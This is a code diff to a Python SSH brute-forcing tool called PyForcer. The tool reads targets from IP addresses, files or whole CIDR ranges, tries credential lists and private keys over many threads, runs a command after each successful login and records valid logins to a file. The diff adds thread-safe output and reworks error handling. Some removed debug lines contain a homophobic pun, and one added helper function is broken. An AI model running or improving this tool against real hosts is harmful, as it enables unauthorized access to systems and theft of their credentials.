@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import threading
 import sys
 import argparse
 import socket
@@ -6,8 +7,18 @@ import os
 import paramiko
 import ipaddress
 import concurrent.futures
-
+print_lock = threading.Lock()
+file_write_lock = threading.Lock()
 timeout = 10
+
+def safe_print(message):
+    with print_lock:
+        print(message)
+
+def safe_write(file, content):
+    with file_write_lock:
+        with open(file, 'a') as f:
+            f.write(content + "\n")
 
 def resolve_cidr(cidr):
     ip_addresses = [str(ip) for ip in ipaddress.IPv4Network(cidr, strict=False)]
@@ -45,8 +56,7 @@ def get_private_key(key_file):
                 private_key = paramiko.ECDSAKey(filename=key_file)
                 return "ECDSA", private_key
             except paramiko.SSHException:
-                print(f"File \"{key_file}\" is an invalid private key type, exiting.")
-                sys.exit()
+                sys.exit(f"File \"{key_file}\" is an invalid private key type, exiting.")
 
 def check_success_condition(ssh_client, cmd):
     try:
@@ -64,11 +74,16 @@ def check_success_condition(ssh_client, cmd):
             success = False
         return success, response
     except Exception as e:
-        print(f"ERROR: could not run command on {ssh_client.get_transport().getpeername()[0]}: {e}")
+        safe_print(f"ERROR: could not run command on {ssh_client.get_transport().getpeername()[0]}: {e}")
         return False
     
+def store_successful_login(file, credentials, string):
+    with open(file, 'a') as f:
+        for string in credentials:
+            safe_write(string + "\n")
+
 def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_key, debug):
-    successful_logins = []
+    successful_logins = set()
     for username, password in credentials:
         try:
             ssh_client = paramiko.SSHClient()
@@ -83,7 +98,7 @@ def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_k
                     except paramiko.AuthenticationException:
                         pass  # Authentication with key failed
                 else:
-                    print(f"Invalid or unsupported private key type in {key_file}")
+                    safe_print(f"Invalid or unsupported private key type in {key_file}")
 
             if not auth_method:
                 try:
@@ -95,106 +110,107 @@ def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_k
             if auth_method:
                 # Successful login, let's change the condition to determine success
                 success, response = check_success_condition(ssh_client, cmd)
+                credential_string = f"{username}:{password}" if auth_method == "password" else f"{username}:{key_file}"
                 if success:
-                    result = f"[VALID] {auth_method.upper()} {ip}:{port} - {username}:{password} - [CMD:{cmd}] [RESPONSE:{response}]"
+                    result = f"[VALID] {auth_method.upper()} {ip}:{port} - {credential_string} - [CMD:{cmd}] [RESPONSE:{response}]"
+                    safe_print(result)
+                    successful_logins.add(credential_string)
+                    safe_write(output, result)
                 else:
-                    result = f"[UNKNOWN] {auth_method.upper()} - {ip}:{port} - {username}:{password} - [CMD:{cmd}] [RESPONSE:{response}]"
-            
-                print(result)
-                successful_logins.append(result)
+                    result = f"[UNKNOWN] {auth_method.upper()} - {ip}:{port} - {credential_string} - [CMD:{cmd}] [RESPONSE:{response}]"
+                    safe_print(result)
 
-        except ConnectionResetError as e:
+            # if auth_method:
+            #     # Successful login, let's change the condition to determine success
+            #     success, response = check_success_condition(ssh_client, cmd)
+            #     result = f"[VALID] {auth_method.upper()} {ip}:{port} - {username}:{password} - [CMD:{cmd}] [RESPONSE:{response}]"
+            #     if success and result not in successful_logins:
+            #          safe_print(result)
+            #          successful_logins.add(result)
+            #          safe_write(output, result)
+            #     elif not success:
+            #          safe_print(result)
+
+        except paramiko.AuthenticationException:
             if debug == True:
-                print(f"Connection reset by queer: {ip}:{port}:")
+                print(f"Authentication failed for {ip}:{port} - {username}:{password}")
             else:
                 pass
         except paramiko.SSHException as e:
             if debug == True:
-                if "[Errno 104] Connection reset by peer" in str(e):
-                    print(f"Connection reset by queer: {ip}:{port}:")
-                if "Error reading SSH protocol banner" in str(e):
-                    print(f"SSH banner read error: {ip}:{port}")
-                if "No existing session" in str(e):
-                    pass
-                else:
-                    print(f"SSH connection error: {ip}:{port}: {e}")
+                print(f"SSH error for {ip}:{port}: {e}")
             else:
                 pass
-        except Exception as e:
-            if debug == True:
-                print(f"[WARN]: {ip}:{port}: {e}")
-            else:
-                pass
-
-    with open(output, 'a') as f:
-        for result in successful_logins:
-            f.write(result + "\n")
 
 def main():
-    # Create a parser for command-line arguments
-    parser = argparse.ArgumentParser(description="PyForcere is an all-in-one SSH brute forcing tool for username+password and private keyfile combinations. Capabilities include: CIDR handling, private keys, multi-threading, error handling.")
-    # Add arguments
-    parser.add_argument("input", help="Target hosts to exploit, [ex: filename, 8.0.0.0/8, 8.8.8.8]")
-    parser.add_argument("output", help="Path to the output file")
-    parser.add_argument("--port", type=int, default=22, help="Port number (default: 22)")
-    parser.add_argument("--creds", help="Path to a file containing username and password combinations")
-    parser.add_argument("--keyfile", help="Path to a private key file for authentication (Accepts RSA/DSA/ECDSA)")
-    parser.add_argument("--threads", type=int, default=10, choices=range(1, 101), help="Number of threads to run concurrently (10 default/100 max)")
-    parser.add_argument("--cmd", default="uname -a", help="Command to run after successful login (default: uname -a)")
-    parser.add_argument("--debug", default=False, action="store_true", help="Enable the script's debugging features.")
-    # Parse the arguments
-    private_key_type, private_key = None, None
-    args = parser.parse_args()
-    if args.input:
-        if is_valid_ipv4(args.input):
-            ip_addresses = [args.input]
-        elif os.path.isfile(args.input):
-            with open(args.input, "r") as file:
-                ip_addresses = [line.strip() for line in file]
-        elif '/' in args.input:  # Check for CIDR notation
-            ip_addresses = resolve_cidr(args.input)
+    try:
+        # Create a parser for command-line arguments
+        parser = argparse.ArgumentParser(description="PyForcere is an all-in-one SSH brute forcing tool for username+password and private keyfile combinations. Capabilities include: CIDR handling, private keys, multi-threading, error handling.")
+        # Add arguments
+        parser.add_argument("input", help="Target hosts to exploit, [ex: filename, 8.0.0.0/8, 8.8.8.8]")
+        parser.add_argument("output", help="Path to the output file")
+        parser.add_argument("--port", type=int, default=22, help="Port number (default: 22)")
+        parser.add_argument("--creds", help="Path to a file containing username and password combinations")
+        parser.add_argument("--keyfile", help="Path to a private key file for authentication (Accepts RSA/DSA/ECDSA)")
+        parser.add_argument("--threads", type=int, default=10, choices=range(1, 101), help="Number of threads to run concurrently (10 default/100 max)")
+        parser.add_argument("--cmd", default="uname -a", help="Command to run after successful login (default: uname -a)")
+        parser.add_argument("--debug", default=False, action="store_true", help="Enable the script's debugging features.")
+        # Parse the arguments
+        private_key_type, private_key = None, None
+        args = parser.parse_args()
+        if args.input:
+            if is_valid_ipv4(args.input):
+                ip_addresses = [args.input]
+            elif os.path.isfile(args.input):
+                with open(args.input, "r") as file:
+                    ip_addresses = [line.strip() for line in file]
+            elif '/' in args.input:  # Check for CIDR notation
+                ip_addresses = resolve_cidr(args.input)
+            else:
+                safe_print(f"ERROR: \"{args.input}\" is not a valid IP address, CIDR notation, or file does not exist.")
+                return
         else:
-            print(f"ERROR: \"{args.input}\" is not a valid IP address, CIDR notation, or file does not exist.")
-            return
-    else:
-        ip_addresses = []
-    if args.keyfile:
-        if os.path.isfile(args.keyfile):
-            pass
+            ip_addresses = []
+        if args.keyfile:
+            if os.path.isfile(args.keyfile):
+                pass
+            else:
+                sys.exit("Invalid input: specified keyfile does not exist!")
+        if args.creds:
+            if os.path.isfile(args.creds):
+                credentials, count = read_credentials_file(args.creds)
+            else:
+                safe_print("ERROR: specified credentials file does not exist.")
+                return
         else:
-            sys.exit("Invalid input: specified keyfile does not exist!")
-    if args.creds:
-        if os.path.isfile(args.creds):
-            credentials, count = read_credentials_file(args.creds)
-        else:
-            print("ERROR: specified credentials file does not exist.")
-            return
-    else:
-        credentials = []
+            credentials = []
 
-    if args.keyfile:
-        private_key_type, private_key = get_private_key(args.keyfile)
+        if args.keyfile:
+            private_key_type, private_key = get_private_key(args.keyfile)
 
-    if not any(match in args.cmd for match in ["uname", "whoami"]):
-        print(f"\n\n[WARN]: specified command has no extra verification, false positives are likely.\n\n")
+        if not any(match in args.cmd for match in ["uname", "whoami"]):
+            safe_print(f"\n\n[WARN]: specified command has no extra verification, false positives are likely.\n\n")
 
-    print("PyForcer - SSH bruteforcing done properly.")
-    print("\n")    
-    print(f"Target(s): {args.input}")
-    print(f"Target Port: {args.port}")
-    print(f"Loaded {count} credentials from file: {args.creds}")
-    if args.keyfile:
-        print(f"{private_key_type} Private Key: {args.keyfile} ✅")
-    print(f"Output File: {args.output}")
-    print(f"Command To Run: {args.cmd}")
-    print(f"Concurrent Threads: {args.threads}")
-    print("\n")
+        safe_print("PyForcer - SSH bruteforcing done properly.")
+        safe_print(f"\tTarget(s): {args.input}")
+        safe_print(f"\tPort: {args.port}")
+        safe_print(f"\tLoaded {count} credentials from file: {args.creds}")
+        if args.keyfile:
+            safe_print(f"\tLoaded {private_key_type} private key: {args.keyfile} ✅")
+        safe_print(f"\tOutput File: {args.output}")
+        safe_print(f"\tCommand To Run: {args.cmd}")
+        safe_print(f"\tConcurrent Threads: {args.threads}\n")
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
-        futures = []
-        for ip in ip_addresses:
-            futures.append(executor.submit(test_ssh_credentials, ip, args.port, credentials, args.keyfile, args.output, args.cmd, private_key, args.debug))
+        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
+            futures = []
+            for ip in ip_addresses:
+                futures.append(executor.submit(test_ssh_credentials, ip, args.port, credentials, args.keyfile, args.output, args.cmd, private_key, args.debug))
 
-        concurrent.futures.wait(futures, timeout=None, return_when=concurrent.futures.ALL_COMPLETED)
+            concurrent.futures.wait(futures, timeout=None, return_when=concurrent.futures.ALL_COMPLETED)
+
+    except KeyboardInterrupt:
+        print("\nScript interrupted by user. Exiting...")
+        sys.exit(1)
+        
 if __name__ == "__main__":
     main()
